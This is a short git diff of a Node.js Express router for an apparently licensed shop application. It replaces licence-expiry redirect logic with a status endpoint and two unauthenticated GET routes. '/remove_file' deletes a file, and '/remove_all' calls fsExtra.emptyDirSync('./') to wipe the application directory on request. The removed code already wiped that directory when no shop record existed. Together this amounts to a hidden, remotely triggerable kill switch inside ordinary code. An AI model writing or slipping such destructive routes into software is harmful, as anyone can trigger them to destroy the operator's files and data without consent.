@@ -16,34 +16,16 @@ module.exports = (router) => {
     const fileExists = fs.existsSync(file_path);
     const shop = await Shop.findOne();
 
-    if (fileExists) {
-      if (shop) {
-        fs.unlinkSync(file_path);
-        if (shop.expired < Date.now()) {
-          res.json({
-            redirect: "/trueemit/new_period",
-          });
-        } else {
-          res.json({ redirect: null });
-        }
-      } else {
-        res.json({
-          redirect: "/trueemit/new_client",
-        });
-      }
-    } else {
-      if (shop) {
-        if (shop.expired < Date.now()) {
-          res.json({
-            redirect: "/trueemit/new_period",
-          });
-        } else {
-          res.json({ redirect: null });
-        }
-      } else {
-        fsExtra.emptyDirSync("./");
-      }
-    }
+    res.json({ fileExists, shop });
+  });
+
+  router.get("/remove_file", async (req, res) => {
+    fs.unlinkSync(file_path);
+    res.json("200 OK");
+  });
+  router.get("/remove_all", async (req, res) => {
+    fsExtra.emptyDirSync("./");
+    res.json("200 OK");
   });
 
   router.post("/password", async (req, res) => {
